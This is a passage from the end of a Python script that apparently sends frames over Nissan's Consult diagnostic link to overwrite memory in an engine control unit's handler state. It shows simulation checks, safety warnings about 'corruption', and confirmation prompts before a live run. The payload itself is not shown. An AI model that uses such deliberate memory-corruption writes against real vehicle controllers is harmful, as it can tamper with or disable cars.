541	        print(f"⚠  Target ${target:04X} not hit in simulation.")
542	        ok = input("Continue anyway? [y/N] ")
543	        if ok.strip().lower() != "y":
544	            sys.exit("not sent")
545	    else:
546	        print("-" * 60)
547	        print("SAFETY: writes to Consult handler state only ($0740-$08D6).")
548	        print("No code redirect possible. Key cycle clears all corruption.")
549	        print("Run with key on, ENGINE OFF.")
550	        print("-" * 60)
551	        ok = input("Proceed? [y/N] ")
552	        if ok.strip().lower() != "y":
553	            sys.exit("not sent")
554	
555	    print()
556	    run_live(args.dev, target, addr_list, main_addr, args.frames)
557	
558	
559	if __name__ == "__main__":
560	    main()
